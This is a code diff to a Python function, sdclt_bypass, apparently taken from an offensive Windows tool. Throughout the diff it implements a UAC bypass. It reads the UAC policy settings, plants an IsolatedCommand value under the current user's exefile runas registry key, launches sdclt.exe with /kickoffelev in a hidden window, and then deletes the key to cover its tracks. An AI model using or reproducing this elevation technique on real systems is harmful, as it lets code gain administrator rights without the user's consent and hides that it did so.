@@ -18,31 +18,34 @@ def cmd_path():
 	else:
 		return False
 
-def sdclt_bypass():	
-	try:
-		PromptBehaviorAdmin = _winreg.QueryValueEx(_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),"ConsentPromptBehaviorAdmin")
-		PromptOnSecureDesktop = _winreg.QueryValueEx(_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),"PromptOnSecureDesktop")
-	except Exception as error:
-		sys.exit()
-	
-	if (PromptBehaviorAdmin[0] == "2" and PromptOnSecureDesktop[0] == "1"):
-		sys.exit()
-	else:
+def sdclt_bypass():
+	if (os.path.isfile(os.path.join("c:\windows\system32\sdclt.exe")) == True):
 		try:
-			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("SOFTWARE\Classes\exefile\shell\runas\command"))
-			_winreg.SetValueEx(_winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("SOFTWARE\Classes\exefile\shell\runas\command")),"IsolatedCommand",0,_winreg.REG_SZ,cmd_path())
-			_winreg.CloseKey(key)
+			PromptBehaviorAdmin = _winreg.QueryValueEx(_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"Software\Microsoft\Windows\CurrentVersion\Policies\System"),"ConsentPromptBehaviorAdmin")
+			PromptOnSecureDesktop = _winreg.QueryValueEx(_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"Software\Microsoft\Windows\CurrentVersion\Policies\System"),"PromptOnSecureDesktop")
 		except Exception as error:
 			sys.exit()
 		
-		try:
-			win32api.ShellExecute(0,None,"c:\windows\system32\sdclt.exe /kickoffelev",None, None,win32con.SW_SHOW)	
-		except Exception as error:
+		if (PromptBehaviorAdmin[0] == "2" and PromptOnSecureDesktop[0] == "1"):
 			sys.exit()
-			
-		time.sleep(5)
-	
-		try:
-			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"SOFTWARE\Classes\exefile")
-		except Exception as error:
-			sys.exit()
+		else:
+			try:
+				key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\exefile\shell\runas\command"))
+				_winreg.SetValueEx(key,"IsolatedCommand",0,_winreg.REG_SZ,cmd_path())
+				_winreg.CloseKey(key)
+			except Exception as error:
+				sys.exit()
+
+			try:
+				win32api.ShellExecute(0,None,"c:\windows\system32\sdclt.exe /kickoffelev",None,None,win32con.SW_HIDE)
+			except Exception as error:
+				sys.exit()
+				
+			time.sleep(5)
+		
+			try:
+				_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\exefile")
+			except Exception as error:
+				sys.exit()
+	else:
+		sys.exit()
